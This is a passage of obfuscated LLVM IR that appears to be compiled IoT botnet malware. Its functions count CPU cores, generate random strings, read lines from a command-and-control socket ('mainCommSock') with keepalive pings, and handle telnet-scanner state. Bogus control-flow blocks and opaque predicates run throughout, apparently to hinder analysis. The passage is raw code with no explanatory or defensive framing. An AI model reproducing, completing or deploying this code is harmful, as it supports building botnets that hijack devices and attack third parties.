  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  call void @uppercase(i8* %46)
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %48 = call i8* @strstr(i8* %47, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i32 0, i32 0)) #10
  %49 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %50 = icmp eq i8* %48, %49
  br i1 %50, label %51, label %226

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @x.33
  %53 = load i32, i32* @y.34
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %51
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %61 = getelementptr inbounds i8, i8* %60, i64 8
  store i8* %61, i8** %14, align 8
  %62 = load i32, i32* @x.33
  %63 = load i32, i32* @y.34
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %70

; <label>:70:                                     ; preds = %originalBBpart220, %originalBBpart28
  %71 = load i32, i32* @x.33
  %72 = load i32, i32* @y.34
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %70
  %79 = load i8*, i8** %14, align 8
  %80 = load i8, i8* %79, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 32
  %83 = load i32, i32* @x.33
  %84 = load i32, i32* @y.34
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %82, label %117, label %91

; <label>:91:                                     ; preds = %originalBBpart212
  %92 = load i32, i32* @x.33
  %93 = load i32, i32* @y.34
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %91
  %100 = load i8*, i8** %14, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 9
  %104 = load i32, i32* @x.33
  %105 = load i32, i32* @y.34
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %103, label %117, label %112

; <label>:112:                                    ; preds = %originalBBpart216
  %113 = load i8*, i8** %14, align 8
  %114 = load i8, i8* %113, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 58
  br label %117

; <label>:117:                                    ; preds = %112, %originalBBpart216, %originalBBpart212
  %118 = phi i1 [ true, %originalBBpart216 ], [ true, %originalBBpart212 ], [ %116, %112 ]
  br i1 %118, label %119, label %138

; <label>:119:                                    ; preds = %117
  %120 = load i32, i32* @x.33
  %121 = load i32, i32* @y.34
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %119
  %128 = load i8*, i8** %14, align 8
  %129 = getelementptr inbounds i8, i8* %128, i32 1
  store i8* %129, i8** %14, align 8
  %130 = load i32, i32* @x.33
  %131 = load i32, i32* @y.34
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %70

; <label>:138:                                    ; preds = %117
  br label %139

; <label>:139:                                    ; preds = %191, %138
  %140 = load i8*, i8** %14, align 8
  %141 = load i8*, i8** %14, align 8
  %142 = call i64 @strlen(i8* %141) #10
  %143 = sub i64 %142, 1
  %144 = getelementptr inbounds i8, i8* %140, i64 %143
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 13
  br i1 %147, label %173, label %148

; <label>:148:                                    ; preds = %139
  %149 = load i32, i32* @x.33
  %150 = load i32, i32* @y.34
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %148
  %157 = load i8*, i8** %14, align 8
  %158 = load i8*, i8** %14, align 8
  %159 = call i64 @strlen(i8* %158) #10
  %160 = sub i64 %159, 1
  %161 = getelementptr inbounds i8, i8* %157, i64 %160
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 10
  %165 = load i32, i32* @x.33
  %166 = load i32, i32* @y.34
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart235, label %originalBB22alteredBB

originalBBpart235:                                ; preds = %originalBB22
  br label %173

; <label>:173:                                    ; preds = %originalBBpart235, %139
  %174 = phi i1 [ true, %139 ], [ %164, %originalBBpart235 ]
  %175 = load i32, i32* @x.33
  %176 = load i32, i32* @y.34
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %173
  %183 = load i32, i32* @x.33
  %184 = load i32, i32* @y.34
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %174, label %191, label %197

; <label>:191:                                    ; preds = %originalBBpart239
  %192 = load i8*, i8** %14, align 8
  %193 = load i8*, i8** %14, align 8
  %194 = call i64 @strlen(i8* %193) #10
  %195 = sub i64 %194, 1
  %196 = getelementptr inbounds i8, i8* %192, i64 %195
  store i8 0, i8* %196, align 1
  br label %139

; <label>:197:                                    ; preds = %originalBBpart239
  %198 = load i32, i32* @x.33
  %199 = load i32, i32* @y.34
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %197
  %206 = load i8*, i8** %14, align 8
  %207 = call i8* @strchr(i8* %206, i32 46) #10
  %208 = icmp ne i8* %207, null
  %209 = load i32, i32* @x.33
  %210 = load i32, i32* @y.34
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %208, label %217, label %220

; <label>:217:                                    ; preds = %originalBBpart243
  %218 = load i8*, i8** %14, align 8
  %219 = call i8* @strchr(i8* %218, i32 46) #10
  store i8 0, i8* %219, align 1
  br label %220

; <label>:220:                                    ; preds = %217, %originalBBpart243
  %221 = load i8*, i8** %11, align 8
  %222 = load i8*, i8** %14, align 8
  %223 = call i8* @strcpy(i8* %221, i8* %222) #2
  %224 = load i32, i32* %12, align 4
  %225 = call i32 @close(i32 %224)
  store i32 0, i32* %10, align 4
  br label %247

; <label>:226:                                    ; preds = %45
  %227 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %227, i8 0, i64 4096, i32 16, i1 false)
  br label %24

; <label>:228:                                    ; preds = %originalBBpart24
  %229 = load i32, i32* @x.33
  %230 = load i32, i32* @y.34
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %228
  %237 = load i32, i32* %12, align 4
  %238 = call i32 @close(i32 %237)
  store i32 1, i32* %10, align 4
  %239 = load i32, i32* @x.33
  %240 = load i32, i32* @y.34
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %247

; <label>:247:                                    ; preds = %originalBBpart247, %220
  %248 = load i32, i32* %10, align 4
  ret i32 %248

originalBBalteredBB:                              ; preds = %originalBB, %1
  %249 = alloca i32, align 4
  %250 = alloca i8*, align 8
  %251 = alloca i32, align 4
  %252 = alloca [4096 x i8], align 16
  %253 = alloca i8*, align 8
  store i8* %0, i8** %250, align 8
  %254 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %254, i32* %251, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  %255 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %256 = load i32, i32* %12, align 4
  %257 = call i8* @fdgets(i8* %255, i32 4096, i32 %256)
  %258 = icmp ne i8* %257, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %51
  %259 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %260 = getelementptr inbounds i8, i8* %259, i64 8
  store i8* %260, i8** %14, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %70
  %261 = load i8*, i8** %14, align 8
  %262 = load i8, i8* %261, align 1
  %263 = zext i8 %262 to i32
  %264 = icmp eq i32 %263, 32
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %91
  %265 = load i8*, i8** %14, align 8
  %266 = load i8, i8* %265, align 1
  %267 = zext i8 %266 to i32
  %268 = icmp eq i32 %267, 9
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %119
  %269 = load i8*, i8** %14, align 8
  %270 = getelementptr inbounds i8, i8* %269, i32 1
  store i8* %270, i8** %14, align 8
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %148
  %271 = load i8*, i8** %14, align 8
  %272 = load i8*, i8** %14, align 8
  %273 = call i64 @strlen(i8* %272) #10
  %_ = sub i64 %273, 1
  %gen = mul i64 %_, 1
  %_23 = sub i64 0, %273
  %gen24 = add i64 %_23, 1
  %_25 = sub i64 0, %273
  %gen26 = add i64 %_25, 1
  %_27 = shl i64 %273, 1
  %_28 = sub i64 %273, 1
  %gen29 = mul i64 %_28, 1
  %_30 = sub i64 %273, 1
  %gen31 = mul i64 %_30, 1
  %_32 = sub i64 %273, 1
  %gen33 = mul i64 %_32, 1
  %274 = sub i64 %273, 1
  %275 = getelementptr inbounds i8, i8* %271, i64 %274
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = icmp eq i32 %277, 10
  br label %originalBB22

originalBB37alteredBB:                            ; preds = %originalBB37, %173
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %197
  %279 = load i8*, i8** %14, align 8
  %280 = call i8* @strchr(i8* %279, i32 46) #10
  %281 = icmp ne i8* %280, null
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %228
  %282 = load i32, i32* %12, align 4
  %283 = call i32 @close(i32 %282)
  store i32 1, i32* %10, align 4
  br label %originalBB45
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:21:                                     ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %originalBBpart226, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %54

; <label>:10:                                     ; preds = %6
  %11 = load i32, i32* @x.37
  %12 = load i32, i32* @y.38
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = call i32 @rand_cmwc()
  %20 = urem i32 %19, 26
  %21 = add i32 %20, 65
  %22 = trunc i32 %21 to i8
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  store i8 %22, i8* %26, align 1
  %27 = load i32, i32* @x.37
  %28 = load i32, i32* @y.38
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* @x.37
  %37 = load i32, i32* @y.38
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %35
  %44 = load i32, i32* %5, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* @x.37
  %47 = load i32, i32* @y.38
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart226, label %originalBB15alteredBB

originalBBpart226:                                ; preds = %originalBB15
  br label %6

; <label>:54:                                     ; preds = %6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %55 = call i32 @rand_cmwc()
  %_ = sub i32 %55, 26
  %gen = mul i32 %_, 26
  %_1 = sub i32 0, %55
  %gen2 = add i32 %_1, 26
  %_3 = sub i32 0, %55
  %gen4 = add i32 %_3, 26
  %56 = urem i32 %55, 26
  %_5 = sub i32 0, %56
  %gen6 = add i32 %_5, 65
  %_7 = sub i32 0, %56
  %gen8 = add i32 %_7, 65
  %_9 = sub i32 0, %56
  %gen10 = add i32 %_9, 65
  %_11 = sub i32 %56, 65
  %gen12 = mul i32 %_11, 65
  %_13 = sub i32 %56, 65
  %gen14 = mul i32 %_13, 65
  %57 = add i32 %56, 65
  %58 = trunc i32 %57 to i8
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  store i8 %58, i8* %62, align 1
  br label %originalBB

originalBB15alteredBB:                            ; preds = %originalBB15, %35
  %63 = load i32, i32* %5, align 4
  %_16 = sub i32 0, %63
  %gen17 = add i32 %_16, 1
  %_18 = sub i32 %63, 1
  %gen19 = mul i32 %_18, 1
  %_20 = sub i32 %63, 1
  %gen21 = mul i32 %_20, 1
  %_22 = sub i32 %63, 1
  %gen23 = mul i32 %_22, 1
  %_24 = shl i32 %63, 1
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %5, align 4
  br label %originalBB15
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %120

; <label>:49:                                     ; preds = %33
  %50 = load i32, i32* @x.39
  %51 = load i32, i32* @y.40
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %49
  %58 = load i32, i32* @x.39
  %59 = load i32, i32* @y.40
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %66

; <label>:66:                                     ; preds = %99, %originalBBpart2
  %67 = load i32, i32* %13, align 4
  %68 = icmp slt i32 %67, 10
  br i1 %68, label %69, label %103

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* @mainCommSock, align 4
  %71 = call i32 (i32, i8*, ...) @sockprintf(i32 %70, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0))
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %72, align 8
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %69
  %75 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %75, i64 0, i64 0
  %77 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %76) #2, !srcloc !2
  %78 = extractvalue { i64, i64* } %77, 0
  %79 = extractvalue { i64, i64* } %77, 1
  %80 = trunc i64 %78 to i32
  store i32 %80, i32* %14, align 4
  %81 = ptrtoint i64* %79 to i64
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %15, align 4
  br label %83

; <label>:83:                                     ; preds = %74
  %84 = load i32, i32* %5, align 4
  %85 = srem i32 %84, 64
  %86 = zext i32 %85 to i64
  %87 = shl i64 1, %86
  %88 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %89 = load i32, i32* %5, align 4
  %90 = sdiv i32 %89, 64
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [16 x i64], [16 x i64]* %88, i64 0, i64 %91
  %93 = load i64, i64* %92, align 8
  %94 = or i64 %93, %87
  store i64 %94, i64* %92, align 8
  %95 = load i32, i32* %5, align 4
  %96 = add nsw i32 %95, 1
  %97 = call i32 @select(i32 %96, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %97, i32* %12, align 4
  %98 = icmp sle i32 %97, 0
  br i1 %98, label %99, label %102

; <label>:99:                                     ; preds = %83
  %100 = load i32, i32* %13, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %13, align 4
  br label %66

; <label>:102:                                    ; preds = %83
  br label %103

; <label>:103:                                    ; preds = %102, %66
  %104 = load i32, i32* @x.39
  %105 = load i32, i32* @y.40
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %103
  %112 = load i32, i32* @x.39
  %113 = load i32, i32* @y.40
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %120

; <label>:120:                                    ; preds = %originalBBpart24, %33
  store i32 0, i32* %18, align 4
  %121 = load i8*, i8** %6, align 8
  store i8* %121, i8** %17, align 8
  br label %122

; <label>:122:                                    ; preds = %156, %120
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, -1
  store i32 %124, i32* %7, align 4
  %125 = icmp sgt i32 %123, 1
  br i1 %125, label %126, label %159

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* @mainCommSock, align 4
  %128 = call i64 @recv(i32 %127, i8* %16, i64 1, i32 0)
  %129 = icmp ne i64 %128, 1
  br i1 %129, label %130, label %148

; <label>:130:                                    ; preds = %126
  %131 = load i32, i32* @x.39
  %132 = load i32, i32* @y.40
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %130
  %139 = load i8*, i8** %17, align 8
  store i8 0, i8* %139, align 1
  store i32 -1, i32* %4, align 4
  %140 = load i32, i32* @x.39
  %141 = load i32, i32* @y.40
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %162

; <label>:148:                                    ; preds = %126
  %149 = load i8, i8* %16, align 1
  %150 = load i8*, i8** %17, align 8
  %151 = getelementptr inbounds i8, i8* %150, i32 1
  store i8* %151, i8** %17, align 8
  store i8 %149, i8* %150, align 1
  %152 = load i8, i8* %16, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 10
  br i1 %154, label %155, label %156

; <label>:155:                                    ; preds = %148
  br label %159

; <label>:156:                                    ; preds = %148
  %157 = load i32, i32* %18, align 4
  %158 = add nsw i32 %157, 1
  store i32 %158, i32* %18, align 4
  br label %122

; <label>:159:                                    ; preds = %155, %122
  %160 = load i8*, i8** %17, align 8
  store i8 0, i8* %160, align 1
  %161 = load i32, i32* %18, align 4
  store i32 %161, i32* %4, align 4
  br label %162

; <label>:162:                                    ; preds = %159, %originalBBpart28
  %163 = load i32, i32* %4, align 4
  ret i32 %163

originalBBalteredBB:                              ; preds = %originalBB, %49
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %103
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %130
  %164 = load i8*, i8** %17, align 8
  store i8 0, i8* %164, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB6
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
